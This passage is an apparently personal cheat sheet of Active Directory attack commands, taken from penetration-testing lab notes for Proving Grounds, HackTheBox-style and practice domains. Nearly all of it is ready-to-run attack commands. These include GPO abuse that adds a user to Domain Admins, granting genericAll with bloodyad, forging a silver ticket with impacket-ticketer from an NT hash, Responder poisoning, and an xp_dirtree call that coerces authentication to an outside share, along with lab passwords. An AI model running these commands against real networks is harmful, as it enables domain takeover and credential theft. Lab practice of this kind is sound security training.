
- [GMSAPasswordReader.exe](https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe) More details on [Heist writeups ](https://infosecwriteups.com/proving-grounds-practice-heist-ed0bef92cc02) and ReadGMSAPassword - get passwords using [bloodyad](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword)
- privilege escalation via GPO generic write
```bash
./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012"
```

```
bloodyad --host $IP -d vault.offsec -u anirudh -p 'SecureHM' add genericAll 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=vault,DC=offsec' anirudh
```
```
python3 pygpoabuse.py 'vault.offsec/anirudh:SecureHM' \
-gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' \
-dc-ip $IP \
-powershell \
-command "net group 'Domain Admins' anirudh /add"
```
```
gpupdate /force
```
### Kerberoasting
- Clock issue
```bash
sudo ntpdate <Domain-Controller-IP>
```

## Silver ticket 
- SID
```bash
impacket-lookupsid hack-academy.local\adiaz:Peru123.@192.168.1.12
```
- Forge ticket
```bash
impacket-ticketer -nthash 99092fa508add7e9e3e919081b48ed2e -domain-sid S-1-5-21-1516340173-3939677173-1136271741 -domain hack-academy.local -spn cifs/CLIENT-2.hack-academy.local administrator

```
- Export
```bash
export KRB5CCNAME=$PWD/Administrator.ccache
```
- Verify 
```bash
impacket-describeTicket administrator.ccache
```

- Test with `-k -no-pass`
```bash
impacket-smbclient -k -no-pass hack-academy.local/administrator@CLIENT-2.hack-academy.local
```
## RDP
```bash
xfreerdp /u:jbailey /p:'Paulio*3' /v:192.168.1.18 /cert:ignore /drive:share,/home/kali/Share
```

## Certipy
```bash
certipy-ad find -u judith.mader@certified.htb -p 'judith09' -dc-ip $target -v vulnerable -stdout
```

## Responder
```bash
sudo responder -I tun0 -A -v
```

```impacket-mssql
xp_dirtree '\\192.168.1.50\share'
```
